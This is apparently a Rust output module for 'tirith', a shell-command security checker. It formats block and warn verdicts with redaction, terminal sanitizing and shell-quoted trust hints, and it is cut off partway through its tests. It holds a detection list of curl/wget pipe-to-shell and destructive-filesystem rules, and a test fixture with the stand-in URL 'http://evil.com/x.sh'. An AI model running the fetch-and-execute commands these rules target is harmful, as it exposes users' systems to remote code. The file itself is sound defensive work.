use std::io::Write;

use crate::safe_command::SafeSuggestion;
use crate::verdict::{Action, Evidence, Finding, RuleId, Verdict};

const SCHEMA_VERSION: u32 = 3;

/// Strip terminal-control bytes from an untrusted finding field before it is
/// written to a terminal. `finding.description` embeds the offending URL/payload
/// verbatim (engine.rs), so a blocklisted URL carrying ANSI/OSC/zero-width could
/// otherwise repaint the user's terminal at warn time. Reuses the MCP filter's
/// scrubber so both surfaces sanitize identically.
fn sanitize_field(s: &str, compiled: &crate::redact::CompiledCustomPatterns) -> String {
    crate::redact::redact_sanitize_redact_with_compiled(s, compiled)
        .replace('\r', "\\r")
        .replace('\n', "\\n")
        .replace('\t', "\\t")
}

/// Redact custom DLP patterns and render an untrusted dynamic value as one
/// terminal-safe physical line. CLI human surfaces use this for paths,
/// coverage locations, and other fields not carried inside a `Verdict`.
pub fn sanitize_human_field(s: &str, custom_patterns: &[String]) -> String {
    let compiled = crate::redact::CompiledCustomPatterns::new(custom_patterns);
    sanitize_human_field_with_compiled(s, &compiled)
}

pub fn sanitize_human_field_with_compiled(
    s: &str,
    compiled: &crate::redact::CompiledCustomPatterns,
) -> String {
    crate::redact::redact_sanitize_redact_with_compiled(s, compiled)
        .replace('\r', "\\r")
        .replace('\n', "\\n")
        .replace('\t', "\\t")
}

/// Streaming final-byte cap for human output. Rendering continues after the
/// cap so the exact omitted byte count is known, but later bytes are discarded
/// rather than retained in an attacker-sized buffer.
pub struct HumanInvocationWriter<W> {
    inner: W,
    source_bytes: usize,
    retained_bytes: usize,
    truncated: bool,
    color: bool,
}

impl<W: Write> HumanInvocationWriter<W> {
    const MARKER_RESERVE: usize = 160;

    pub fn new(inner: W, color: bool) -> Self {
        Self {
            inner,
            source_bytes: 0,
            retained_bytes: 0,
            truncated: false,
            color,
        }
    }

    pub fn finish(mut self) -> std::io::Result<()> {
        if self.truncated {
            if self.color {
                self.inner.write_all(b"\x1b[0m")?;
            }
            let omitted_bytes = self.source_bytes.saturating_sub(self.retained_bytes);
            writeln!(
                self.inner,
                "\n[presentation truncated: omitted_bytes={omitted_bytes}]"
            )?;
        }
        self.inner.flush()
    }

    pub fn is_truncated(&self) -> bool {
        self.truncated
    }
}

impl<W: Write> Write for HumanInvocationWriter<W> {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        self.source_bytes = self.source_bytes.saturating_add(bytes.len());
        if self.truncated {
            return Ok(bytes.len());
        }

        let limit = crate::verdict::MAX_PRESENTATION_BYTES.saturating_sub(Self::MARKER_RESERVE);
        let available = limit.saturating_sub(self.retained_bytes);
        if bytes.len() <= available {
            self.inner.write_all(bytes)?;
            self.retained_bytes += bytes.len();
            return Ok(bytes.len());
        }

        let mut end = available.min(bytes.len());
        while end > 0 && std::str::from_utf8(&bytes[..end]).is_err() {
            end -= 1;
        }
        self.inner.write_all(&bytes[..end])?;
        self.retained_bytes += end;
        self.truncated = true;
        Ok(bytes.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        self.inner.flush()
    }
}

/// A [`Finding`] serialized with its per-rule `remediation` appended. The
/// remediation text is static and secret-free (no redaction needed); this view
/// confines it to the `check`/`paste` JSON surface, leaving every other
/// `Finding` consumer (SARIF, audit, last-trigger) unchanged.
#[derive(serde::Serialize)]
pub struct FindingView<'a> {
    #[serde(flatten)]
    pub finding: &'a Finding,
    /// Per-rule remediation. Empty string omitted.
    #[serde(skip_serializing_if = "str::is_empty")]
    pub remediation: &'a str,
}

impl<'a> FindingView<'a> {
    fn of(finding: &'a Finding) -> Self {
        FindingView {
            finding,
            remediation: crate::rule_explanations::remediation(finding.rule_id),
        }
    }
}

/// JSON output wrapper with schema version.
#[derive(serde::Serialize)]
pub struct JsonOutput<'a> {
    pub schema_version: u32,
    pub action: Action,
    pub findings: Vec<FindingView<'a>>,
    pub tier_reached: u8,
    pub bypass_requested: bool,
    pub bypass_honored: bool,
    pub interactive_detected: bool,
    pub policy_path_used: &'a Option<String>,
    pub timings_ms: &'a crate::verdict::Timings,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub urls_extracted_count: Option<usize>,
    /// Safer-command suggestions: a (possibly empty) array when the caller
    /// passed `--suggest-safe-command`, omitted otherwise. These are owned
    /// redacted copies (not borrowed) because suggestion prose can re-embed the
    /// original command/URL/path. If redaction would mutate `safe_command`, the
    /// executable field is omitted instead: only the exact analyzed command may
    /// cross that contract. See [`redact_suggestion`].
    #[serde(skip_serializing_if = "Option::is_none")]
    pub safe_suggestions: Option<Vec<SafeSuggestion>>,
}

/// Return a redacted clone of a [`SafeSuggestion`] for JSON output.
///
/// `safe_command` re-embeds the user's original command/URL/path. Executable
/// suggestions are limited to the verified fail-closed pipe runner, which
/// splices attacker- or user-controlled input back in. Guidance-only rationale
/// can also include runtime-derived context.
/// Rationale is scrubbed with the SAME `custom_patterns` the caller uses for
/// findings. An executable command cannot be scrubbed in place: redaction would
/// produce a different string that was never analyzed. When it would change,
/// the command is withheld and the suggestion remains guidance-only.
///
fn redact_suggestion(
    s: &SafeSuggestion,
    compiled: &crate::redact::CompiledCustomPatterns,
) -> SafeSuggestion {
    let safe_command = s.safe_command.as_ref().and_then(|command| {
        let projected =
            crate::redact::redact_sanitize_redact_command_with_compiled(command, compiled);
        // Executable bytes are an identity contract: sanitizing or redacting
        // even one byte means the analyzed command can no longer be emitted.
        (projected == *command).then(|| command.clone())
    });
    let mut rationale = crate::redact::redact_sanitize_redact_with_compiled(&s.rationale, compiled);
    if s.safe_command.is_some() && safe_command.is_none() {
        rationale.push_str(
            " Executable command omitted because configured redaction would change the verified bytes.",
        );
    }
    SafeSuggestion {
        rule_id: crate::redact::redact_sanitize_redact_with_compiled(&s.rule_id, compiled),
        safe_command,
        rationale,
        remediation: crate::redact::redact_sanitize_redact_with_compiled(&s.remediation, compiled),
    }
}

/// Write verdict as JSON to the given writer.
pub fn write_json(
    verdict: &Verdict,
    custom_patterns: &[String],
    w: impl Write,
) -> std::io::Result<()> {
    write_json_with_suggestions(verdict, custom_patterns, None, w)
}

/// Write verdict as JSON, optionally embedding safe-command suggestions.
/// `None` is identical to [`write_json`].
pub fn write_json_with_suggestions(
    verdict: &Verdict,
    custom_patterns: &[String],
    suggestions: Option<&[SafeSuggestion]>,
    mut w: impl Write,
) -> std::io::Result<()> {
    // Redact before applying presentation bounds: truncating first can split a
    // configured secret and make it fail to match the redactor.
    let compiled = crate::redact::CompiledCustomPatterns::new_silent(custom_patterns);
    let mut display = verdict.clone();
    crate::redact::redact_verdict_with_compiled(&mut display, &compiled);
    crate::verdict::bound_verdict_for_output(&mut display);
    let findings: Vec<FindingView> = display.findings.iter().map(FindingView::of).collect();
    // A SafeSuggestion's `safe_command` re-embeds the original command/URL/path,
    // so it would reintroduce exactly the secrets `custom_patterns` redacted out
    // of `findings`. Scrub suggestion prose with the same patterns and withhold
    // any executable string that redaction would change (see `redact_suggestion`).
    let safe_suggestions = suggestions.map(|sugg| {
        sugg.iter()
            .map(|s| redact_suggestion(s, &compiled))
            .collect::<Vec<_>>()
    });
    let output = JsonOutput {
        schema_version: SCHEMA_VERSION,
        action: display.action,
        findings,
        tier_reached: display.tier_reached,
        bypass_requested: display.bypass_requested,
        bypass_honored: display.bypass_honored,
        interactive_detected: display.interactive_detected,
        policy_path_used: &display.policy_path_used,
        timings_ms: &display.timings_ms,
        urls_extracted_count: display.urls_extracted_count,
        safe_suggestions,
    };
    let mut output = serde_json::to_value(&output)?;
    let policy_diagnostics = crate::policy::drain_captured_policy_diagnostics_for_output(&compiled);
    if !policy_diagnostics.is_empty() {
        let count = policy_diagnostics.len();
        let diagnostics = policy_diagnostics
            .into_iter()
            .map(|diagnostic| diagnostic.replace(['\r', '\n', '\t'], " "))
            .map(serde_json::Value::String)
            .collect();
        if let Some(object) = output.as_object_mut() {
            object.insert("policy_diagnostics_count".to_string(), count.into());
            object.insert(
                "policy_diagnostics".to_string(),
                serde_json::Value::Array(diagnostics),
            );
        }
    }
    crate::redact::redact_json_strings(&mut output, &compiled);
    let output = crate::verdict::bound_json_value_for_output(output);
    serde_json::to_writer(&mut w, &output)?;
    writeln!(w)?;
    Ok(())
}

/// Write human-readable verdict to stderr.
///
/// `warn_only` (caller cannot enforce a block, e.g. bash preexec `DEBUG` trap)
/// renders Block as `DETECTED (... command will still run)` instead of `BLOCKED`
/// and rewrites the bypass hint. Human-only — it MUST never reach `write_json`,
/// audit logs, or exit codes.
pub fn write_human(verdict: &Verdict, warn_only: bool, w: impl Write) -> std::io::Result<()> {
    write_human_with_patterns(verdict, warn_only, &[], w)
}

/// Pattern-aware human renderer. Kept under a distinct name so the public
/// 0.3.3 `write_human(verdict, warn_only, writer)` arity remains source-compatible.
pub fn write_human_with_patterns(
    verdict: &Verdict,
    warn_only: bool,
    custom_patterns: &[String],
    w: impl Write,
) -> std::io::Result<()> {
    let color = crate::style::use_color_for(crate::style::Stream::Stderr);
    let mut invocation = HumanInvocationWriter::new(w, color);
    let compiled = crate::redact::CompiledCustomPatterns::new(custom_patterns);
    write_human_to_invocation_with_compiled(verdict, warn_only, &compiled, &mut invocation)?;
    invocation.finish()
}

/// Render into an invocation-level writer supplied by the caller. This is the
/// scan/check/paste seam: verdict, coverage, provenance, and suggestions share
/// exactly one final-byte budget and one truncation marker.
pub fn write_human_to_invocation_with_patterns<W: Write>(
    verdict: &Verdict,
    warn_only: bool,
    custom_patterns: &[String],
    invocation: &mut HumanInvocationWriter<W>,
) -> std::io::Result<()> {
    let compiled = crate::redact::CompiledCustomPatterns::new(custom_patterns);
    write_human_to_invocation_with_compiled(verdict, warn_only, &compiled, invocation)
}

pub fn write_human_to_invocation_with_compiled<W: Write>(
    verdict: &Verdict,
    warn_only: bool,
    compiled: &crate::redact::CompiledCustomPatterns,
    invocation: &mut HumanInvocationWriter<W>,
) -> std::io::Result<()> {
    write_captured_policy_diagnostics_human(compiled, &mut *invocation)?;
    if crate::style::use_color_for(crate::style::Stream::Stderr) {
        write_human_color_into(verdict, warn_only, compiled, invocation)
    } else {
        write_human_no_color_into(verdict, warn_only, compiled, invocation)
    }
}

fn write_captured_policy_diagnostics_human(
    compiled: &crate::redact::CompiledCustomPatterns,
    mut writer: impl Write,
) -> std::io::Result<()> {
    for diagnostic in crate::policy::drain_captured_policy_diagnostics_for_output(compiled) {
        let diagnostic = sanitize_human_field_with_compiled(&diagnostic, compiled);
        writeln!(writer, "tirith: policy diagnostic: {diagnostic}")?;
    }
    Ok(())
}

fn write_human_color_into(
    verdict: &Verdict,
    warn_only: bool,
    compiled: &crate::redact::CompiledCustomPatterns,
    mut w: impl Write,
) -> std::io::Result<()> {
    let original_verdict = verdict;
    let mut display = verdict.clone();
    crate::redact::redact_verdict_with_compiled(&mut display, compiled);
    crate::verdict::bound_verdict_for_output(&mut display);
    let verdict = &display;
    if verdict.findings.is_empty() {
        return Ok(());
    }
    let is_warn_only_block = warn_only && verdict.action == Action::Block;
    let action_str = match verdict.action {
        Action::Allow => "INFO",
        Action::Warn | Action::WarnAck => "WARNING",
        Action::Block if is_warn_only_block => {
            "DETECTED (shell hook cannot block in preexec mode — command will still run)"
        }
        Action::Block => "BLOCKED",
    };

    if let Some(ref reason) = verdict.escalation_reason {
        writeln!(
            w,
            "tirith: {action_str} (escalated: {})",
            sanitize_field(reason, compiled)
        )?;
    } else {
        writeln!(w, "tirith: {action_str}")?;
    }

    for finding in &verdict.findings {
        let sev = crate::style::severity_label(&finding.severity, crate::style::Stream::Stderr);

        writeln!(
            w,
            "  {} {} — {}",
            sev,
            finding.rule_id,
            sanitize_field(&finding.title, compiled)
        )?;
        writeln!(w, "    {}", sanitize_field(&finding.description, compiled))?;

        for evidence in &finding.evidence {
            if let Evidence::HomoglyphAnalysis {
                raw,
                escaped,
                suspicious_chars,
            } = evidence
            {
                writeln!(w)?;
                let visual = format_visual_with_markers(raw, suspicious_chars, compiled);
                writeln!(w, "    Visual:  {visual}")?;
                let escaped = sanitize_field(escaped, compiled);
                let esc_styled = if crate::style::use_color_for(crate::style::Stream::Stderr) {
                    format!("\x1b[33m{escaped}\x1b[0m")
                } else {
                    escaped
                };
                writeln!(w, "    Escaped: {esc_styled}")?;

                if !suspicious_chars.is_empty() {
                    writeln!(w)?;
                    let header =
                        crate::style::bold("Suspicious bytes:", crate::style::Stream::Stderr);
                    writeln!(w, "    {header}")?;
                    for sc in suspicious_chars {
                        writeln!(
                            w,
                            "      {:08x}: {} {:6} {}",
                            sc.offset,
                            sanitize_field(&sc.hex_bytes, compiled),
                            sanitize_field(&sc.codepoint, compiled),
                            sanitize_field(&sc.description, compiled)
                        )?;
                    }
                }
            }
        }

        let fix = crate::rule_explanations::remediation(finding.rule_id);
        if !fix.is_empty() {
            let label = crate::style::bold("Fix:", crate::style::Stream::Stderr);
            writeln!(w, "    {label} {fix}")?;
        }
    }

    if verdict.action == Action::Block {
        write_block_advisories(verdict, original_verdict, compiled, &mut w)?;
    }

    if verdict.action == Action::Block && verdict.bypass_available {
        if is_warn_only_block {
            writeln!(
                w,
                "  Safer: use an enter-capable shell (bash 5+/zsh/fish) to actually block this, or prefix with TIRITH=0 to suppress."
            )?;
        } else {
            writeln!(
                w,
                "  Bypass: prefix your command with TIRITH=0 (applies to that command only)"
            )?;
        }
    }

    Ok(())
}

/// True for the destructive-filesystem and fetch-pipe rules whose presence in a
/// Block verdict warrants the blast-radius header (item 14c). Covers the whole
/// `Blast*` family (both the hot-path `cheap_check` rules and the
/// `tirith preview` simulator rules, so a preview verdict reads the same) and
/// every pipe-to-interpreter variant. This list is hand-maintained: `matches!`
/// falls through to `false`, so a new destructive/fetch RuleId added to the enum
/// will silently NOT get the blast-radius header until it is added here.
fn is_destructive_or_fetch_pipe(r: RuleId) -> bool {
    matches!(
        r,
        RuleId::BlastDeletesOutsideRepo
            | RuleId::BlastWritesSystemPath
            | RuleId::BlastSymlinkTraversal
            | RuleId::BlastEmptyVarGlob
            | RuleId::BlastFindDelete
            | RuleId::BlastRsyncDelete
            | RuleId::BlastLargeFileCount
            | RuleId::PipeToInterpreter
            | RuleId::CurlPipeShell
            | RuleId::WgetPipeShell
            | RuleId::HttpiePipeShell
            | RuleId::XhPipeShell
    )
}

/// Shared advisory block appended to a `Block` verdict by both `write_human` and
/// `write_human_no_color` (presentation only — no detection/verdict logic).
///
/// Emits, in order:
/// * **14c blast-radius header** — when the verdict ALREADY contains any
///   destructive/fetch-pipe finding (the engine ran `blast_radius::cheap_check`
///   on the exec path, so this only summarizes existing findings; it never
///   recomputes). One line, pointing at `tirith preview`.
/// * **14a "To allow" line** — the first finding carrying a URL or host in its
///   evidence yields a copy-pasteable `tirith trust add` invocation. A full URL
///   is a NARROW trust pattern (no `--broad`); a bare domain needs `--broad`
///   because `trust add` rejects bare domains otherwise. Findings without any
///   URL/host (e.g. a destructive-fs block) emit no line.
///
/// Both lines are part of the BLOCK verdict the user must see — unconditional,
/// never gated on a quiet flag.
fn write_block_advisories(
    verdict: &Verdict,
    original_verdict: &Verdict,
    compiled: &crate::redact::CompiledCustomPatterns,
    mut w: impl Write,
) -> std::io::Result<()> {
    // 14c — summarize the destructive/fetch-pipe findings already in the verdict.
    let destructive_count = verdict
        .findings
        .iter()
        .filter(|f| is_destructive_or_fetch_pipe(f.rule_id))
        .count();
    if destructive_count > 0 {
        writeln!(
            w,
            "  blast radius: {destructive_count} finding(s) here can destroy files or run remote code — preview with `tirith preview -- <cmd>`"
        )?;
    }

    // 14a — only a finding that survived this exact bounded presentation may
    // yield a trust hint. Pair the displayed finding with its original raw
    // source by index so omitted evidence can never create an invisible allow
    // command and a pre-redacted placeholder can never become a trust target.
    let retained_indices =
        crate::verdict::retained_finding_indices_for_output(&original_verdict.findings);
    for (original_index, displayed) in retained_indices.into_iter().zip(verdict.findings.iter()) {
        let finding = &original_verdict.findings[original_index];
        if finding.severity < crate::verdict::Severity::High || displayed.rule_id != finding.rule_id
        {
            continue;
        }
        let rule = finding.rule_id; // snake_case via Display
                                    // Prefer a full URL: it is a NARROW trust pattern, so no `--broad`.
        if let Some(url) = first_url_in_evidence(&finding.evidence) {
            // The URL is attacker-controlled and the line is meant to be
            // copy/pasted into a shell, so it MUST be shell-single-quoted: a URL
            // carrying `$( )`, backticks, `;`, spaces, a `>` redirect, or a glob
            // would otherwise execute the moment the developer pastes it.
            // `sanitize_field` (terminal-control scrub, kept for display defense)
            // is NOT a shell escaper. If the target can't be safely single-quoted
            // (e.g. it contains a newline), refuse to print a runnable command. And
            // if the scrub CHANGED the target (zero-width/control bytes stripped),
            // a `trust add <scrubbed>` would trust a DIFFERENT target than the one
            // that was blocked, so fall back to the manual message rather than
            // emit a misleading command.
            let displayed_url = first_url_in_evidence(&displayed.evidence);
            let redacted = crate::redact::redact_with_compiled(url, compiled);
            let sanitized = sanitize_field(url, compiled);
            let is_placeholder = url.to_ascii_lowercase().contains("[redacted");
            let quoted = if !is_placeholder
                && displayed_url == Some(url)
                && redacted == url
                && sanitized == url
            {
                crate::safe_command::shell_single_quote(&sanitized)
            } else {
                None
            };
            match quoted {
                Some(quoted) => writeln!(
                    w,
                    "  To allow: tirith trust add {quoted} --rule {rule} --ttl 30d"
                )?,
                None => writeln!(
                    w,
                    "  To allow: trust this target manually with `tirith trust add` \
                     (it contains characters unsafe to embed in a suggested command)."
                )?,
            }
            break;
        }
        // Else fall back to a bare domain; `trust add` rejects bare domains
        // without `--broad`, and `--broad` trusts the whole domain.
        let domains = crate::session_warnings::extract_domains_from_evidence(&finding.evidence);
        if let Some(domain) = domains.first() {
            // Same shell-injection hazard as the URL branch: single-quote the
            // attacker-controlled domain before it lands in a pasteable command,
            // and fall back to the manual message if the scrub changed the target
            // (a `trust add <scrubbed>` would trust a different domain than blocked).
            let redacted = crate::redact::redact_with_compiled(domain, compiled);
            let sanitized = sanitize_field(domain, compiled);
            let displayed_domains =
                crate::session_warnings::extract_domains_from_evidence(&displayed.evidence);
            let is_placeholder = domain.to_ascii_lowercase().contains("[redacted");
            let quoted = if !is_placeholder
                && displayed_domains.first() == Some(domain)
                && &redacted == domain
                && &sanitized == domain
            {
                crate::safe_command::shell_single_quote(&sanitized)
            } else {
                None
            };
            match quoted {
                Some(quoted) => writeln!(
                    w,
                    "  To allow (trusts the whole domain): tirith trust add {quoted} --broad --rule {rule} --ttl 30d"
                )?,
                None => writeln!(
                    w,
                    "  To allow: trust this target manually with `tirith trust add` \
                     (it contains characters unsafe to embed in a suggested command)."
                )?,
            }
            break;
        }
    }

    Ok(())
}

/// The raw string of the first `Evidence::Url` in a finding's evidence, if any.
/// This is the only `Evidence` variant that carries a full URL verbatim; host-
/// only variants (`HostComparison`) are handled by the domain fallback in
/// [`write_block_advisories`].
fn first_url_in_evidence(evidence: &[Evidence]) -> Option<&str> {
    evidence.iter().find_map(|ev| match ev {
        Evidence::Url { raw } => Some(raw.as_str()),
        _ => None,
    })
}

/// Format a string highlighting suspicious characters — red background when
/// color is enabled, bracket-wrapped (`[x]`) when color is off.
///
/// `raw` is untrusted (the offending input verbatim), so it is scrubbed of
/// terminal-control / zero-width bytes before emission, mirroring the
/// title/description sanitization (F11). Marker placement stays byte-exact: each
/// run of non-suspicious chars is sanitized as a unit (so multi-byte ESC
/// sequences are stripped whole, not split), and the marker boundaries are keyed
/// off the ORIGINAL `raw` byte offsets, so the highlight never desyncs.
fn format_visual_with_markers(
    raw: &str,
    suspicious_chars: &[crate::verdict::SuspiciousChar],
    compiled: &crate::redact::CompiledCustomPatterns,
) -> String {
    use std::collections::HashSet;

    let suspicious_offsets: HashSet<usize> = suspicious_chars.iter().map(|sc| sc.offset).collect();
    let use_color = crate::style::use_color_for(crate::style::Stream::Stderr);

    let mut result = String::new();
    let mut run = String::new();
    let mut byte_offset = 0;

    for ch in raw.chars() {
        if suspicious_offsets.contains(&byte_offset) {
            // Flush the pending (untrusted) run through the sanitizer as a unit so
            // any multi-byte escape sequence is removed whole.
            if !run.is_empty() {
                result.push_str(&sanitize_field(&run, compiled));
                run.clear();
            }
            // Suspicious chars are confusable letters (non-ASCII), never ASCII
            // escape introducers, so a single-char scrub is safe here.
            let safe = sanitize_field(ch.encode_utf8(&mut [0u8; 4]), compiled);
            if use_color {
                result.push_str("\x1b[41m\x1b[97m"); // red bg, white fg
                result.push_str(&safe);
                result.push_str("\x1b[0m");
            } else {
                result.push('[');
                result.push_str(&safe);
                result.push(']');
            }
        } else {
            run.push(ch);
        }
        byte_offset += ch.len_utf8();
    }
    if !run.is_empty() {
        result.push_str(&sanitize_field(&run, compiled));
    }

    result
}

/// Write human-readable output to stderr, respecting color preferences.
/// Uses the no-color path when stderr is not a TTY or `NO_COLOR` is set.
pub fn write_human_auto(verdict: &Verdict, warn_only: bool) -> std::io::Result<()> {
    write_human_auto_with_patterns(verdict, warn_only, &[])
}

/// Pattern-aware stderr renderer; see [`write_human_with_patterns`].
pub fn write_human_auto_with_patterns(
    verdict: &Verdict,
    warn_only: bool,
    custom_patterns: &[String],
) -> std::io::Result<()> {
    let color = crate::style::use_color_for(crate::style::Stream::Stderr);
    let mut invocation = HumanInvocationWriter::new(std::io::stderr().lock(), color);
    write_human_to_invocation_with_patterns(verdict, warn_only, custom_patterns, &mut invocation)?;
    invocation.finish()
}

/// Write the `--suggest-safe-command` block: a safer command when one exists,
/// else an honest "no automatic rewrite" line, plus the per-rule remediation.
/// Advisory output only; never affects exit codes.
pub fn write_safe_suggestions(
    suggestions: &[SafeSuggestion],
    custom_patterns: &[String],
    mut w: impl Write,
) -> std::io::Result<()> {
    if suggestions.is_empty() {
        return Ok(());
    }
    let stream = crate::style::Stream::Stderr;
    writeln!(
        w,
        "{}",
        crate::style::bold("tirith: safer alternative", stream)
    )?;
    for s in suggestions {
        let rule_id = sanitize_suggestion_line(&s.rule_id, custom_patterns);
        let rationale = sanitize_suggestion_line(&s.rationale, custom_patterns);
        let remediation = sanitize_suggestion_line(&s.remediation, custom_patterns);
        writeln!(w, "  {rule_id}")?;
        if let Some(cmd) = s.safe_command.as_ref() {
            // Redacting an executable suggestion would create bytes that were
            // never analyzed. Terminal/layout sanitization has the same identity
            // consequence. Match the JSON contract and withhold the executable
            // whenever its safe display projection differs from the verified
            // bytes; guidance remains available below.
            let redacted = crate::redact::redact_with_custom(cmd, custom_patterns);
            let display = sanitize_suggestion_line(cmd, custom_patterns);
            if redacted == *cmd && display == *cmd {
                writeln!(w, "    {} {display}", crate::style::bold("try:", stream))?;
            } else {
                writeln!(
                    w,
                    "    {} executable command omitted because redaction would change the verified bytes",
                    crate::style::bold("try:", stream)
                )?;
            }
        }
        writeln!(w, "    why: {rationale}")?;
        if !remediation.is_empty() {
            writeln!(
                w,
                "    {} {}",
                crate::style::bold("fix:", stream),
                remediation
            )?;
        }
    }
    Ok(())
}

/// Produce one terminal-safe physical line for a suggestion field. Redaction
/// happens before display sanitization so a malicious custom-pattern match
/// cannot introduce controls, and layout bytes are rendered visibly rather
/// than allowing a field to escape its intended line.
fn sanitize_suggestion_line(value: &str, custom_patterns: &[String]) -> String {
    crate::redact::redact_sanitize_redact(value, custom_patterns)
        .replace('\r', "\\r")
        .replace('\n', "\\n")
        .replace('\t', "\\t")
}

/// Write human-readable output without ANSI colors.
#[cfg(test)]
fn write_human_no_color(
    verdict: &Verdict,
    warn_only: bool,
    custom_patterns: &[String],
    w: impl Write,
) -> std::io::Result<()> {
    let mut invocation = HumanInvocationWriter::new(w, false);
    let compiled = crate::redact::CompiledCustomPatterns::new(custom_patterns);
    write_captured_policy_diagnostics_human(&compiled, &mut invocation)?;
    write_human_no_color_into(verdict, warn_only, &compiled, &mut invocation)?;
    invocation.finish()
}

fn write_human_no_color_into(
    verdict: &Verdict,
    warn_only: bool,
    compiled: &crate::redact::CompiledCustomPatterns,
    mut w: impl Write,
) -> std::io::Result<()> {
    let original_verdict = verdict;
    let mut display = verdict.clone();
    crate::redact::redact_verdict_with_compiled(&mut display, compiled);
    crate::verdict::bound_verdict_for_output(&mut display);
    let verdict = &display;
    if verdict.findings.is_empty() {
        return Ok(());
    }
    let is_warn_only_block = warn_only && verdict.action == Action::Block;
    let action_str = match verdict.action {
        Action::Allow => "INFO",
        Action::Warn | Action::WarnAck => "WARNING",
        Action::Block if is_warn_only_block => {
            "DETECTED (shell hook cannot block in preexec mode — command will still run)"
        }
        Action::Block => "BLOCKED",
    };

    if let Some(ref reason) = verdict.escalation_reason {
        writeln!(
            w,
            "tirith: {action_str} (escalated: {})",
            sanitize_field(reason, compiled)
        )?;
    } else {
        writeln!(w, "tirith: {action_str}")?;
    }

    for finding in &verdict.findings {
        writeln!(
            w,
            "  [{}] {} — {}",
            finding.severity,
            finding.rule_id,
            sanitize_field(&finding.title, compiled)
        )?;
        writeln!(w, "    {}", sanitize_field(&finding.description, compiled))?;

        for evidence in &finding.evidence {
            if let Evidence::HomoglyphAnalysis {
                raw,
                escaped,
                suspicious_chars,
            } = evidence
            {
                writeln!(w)?;
                let visual = format_visual_with_brackets(raw, suspicious_chars, compiled);
                writeln!(w, "    Visual:  {visual}")?;
                writeln!(w, "    Escaped: {}", sanitize_field(escaped, compiled))?;

                if !suspicious_chars.is_empty() {
                    writeln!(w)?;
                    writeln!(w, "    Suspicious bytes:")?;
                    for sc in suspicious_chars {
                        writeln!(
                            w,
                            "      {:08x}: {} {:6} {}",
                            sc.offset,
                            sanitize_field(&sc.hex_bytes, compiled),
                            sanitize_field(&sc.codepoint, compiled),
                            sanitize_field(&sc.description, compiled)
                        )?;
                    }
                }
            }
        }

        let fix = crate::rule_explanations::remediation(finding.rule_id);
        if !fix.is_empty() {
            writeln!(w, "    Fix: {fix}")?;
        }
    }

    if verdict.action == Action::Block {
        write_block_advisories(verdict, original_verdict, compiled, &mut w)?;
    }

    if verdict.action == Action::Block && verdict.bypass_available {
        if is_warn_only_block {
            writeln!(
                w,
                "  Safer: use an enter-capable shell (bash 5+/zsh/fish) to actually block this, or prefix with TIRITH=0 to suppress."
            )?;
        } else {
            writeln!(
                w,
                "  Bypass: prefix your command with TIRITH=0 (applies to that command only)"
            )?;
        }
    }

    Ok(())
}

/// Format a string with brackets around suspicious characters (for no-color mode).
///
/// `raw` is untrusted, so it is scrubbed of terminal-control / zero-width bytes
/// before emission (F11). Marker placement stays byte-exact: each run of
/// non-suspicious chars is sanitized as a unit (so multi-byte ESC sequences are
/// stripped whole, not split), and the bracket boundaries are keyed off the
/// ORIGINAL `raw` byte offsets, so the highlight never desyncs.
fn format_visual_with_brackets(
    raw: &str,
    suspicious_chars: &[crate::verdict::SuspiciousChar],
    compiled: &crate::redact::CompiledCustomPatterns,
) -> String {
    use std::collections::HashSet;

    let suspicious_offsets: HashSet<usize> = suspicious_chars.iter().map(|sc| sc.offset).collect();

    let mut result = String::new();
    let mut run = String::new();
    let mut byte_offset = 0;

    for ch in raw.chars() {
        if suspicious_offsets.contains(&byte_offset) {
            if !run.is_empty() {
                result.push_str(&sanitize_field(&run, compiled));
                run.clear();
            }
            let safe = sanitize_field(ch.encode_utf8(&mut [0u8; 4]), compiled);
            result.push('[');
            result.push_str(&safe);
            result.push(']');
        } else {
            run.push(ch);
        }
        byte_offset += ch.len_utf8();
    }
    if !run.is_empty() {
        result.push_str(&sanitize_field(&run, compiled));
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Action, Evidence, Finding, RuleId, Severity, Timings, Verdict};

    fn block_verdict_with_bypass() -> Verdict {
        let mut v = Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::PlainHttpToSink,
                severity: Severity::High,
                title: "Plain HTTP URL in execution context".to_string(),
                description: "test".to_string(),
                evidence: vec![Evidence::Url {
                    raw: "http://evil.com/x.sh".to_string(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Timings {
                tier0_ms: 0.0,
                tier1_ms: 0.0,
                tier2_ms: None,
                tier3_ms: None,
                total_ms: 0.0,
            },
        );
        // from_findings sets action based on severity; ensure it's Block for this test
        v.action = Action::Block;
        v.bypass_available = true;
        v
    }

    #[test]
    fn write_human_no_color_warn_only_renders_detected() {
        let verdict = block_verdict_with_bypass();
        let mut buf = Vec::new();
        write_human_no_color(&verdict, true, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            !out.contains("BLOCKED"),
            "warn-only must not render BLOCKED: {out}"
        );
        assert!(
            out.contains("DETECTED (shell hook cannot block in preexec mode"),
            "warn-only must render DETECTED with explanation: {out}"
        );
        assert!(
            !out.contains("Bypass:"),
            "warn-only must replace the Bypass hint: {out}"
        );
        assert!(
            out.contains("Safer:"),
            "warn-only must render the Safer hint: {out}"
        );
    }

    #[test]
    fn write_human_no_color_plain_renders_blocked() {
        let verdict = block_verdict_with_bypass();
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains("BLOCKED"),
            "default must still render BLOCKED: {out}"
        );
        assert!(
            !out.contains("DETECTED"),
            "default must not render DETECTED: {out}"
        );
        assert!(
            out.contains("Bypass:"),
            "default must render the Bypass hint: {out}"
        );
    }

    #[test]
    fn warn_only_flag_does_not_reach_write_json() {
        // Invariant: `write_json` takes a `Verdict` (no warn_only parameter),
        // so the flag literally cannot be serialized into machine output.
        // This test pins down the shape — any refactor that passes warn_only
        // into write_json would require updating this assertion too, which
        // is the review bar the plan wants.
        let verdict = block_verdict_with_bypass();
        let mut buf = Vec::new();
        write_json(&verdict, &[], &mut buf).unwrap();
        let json = String::from_utf8(buf).unwrap();
        assert!(
            !json.contains("warn_only"),
            "JSON must not carry warn_only: {json}"
        );
        assert!(
            !json.contains("DETECTED"),
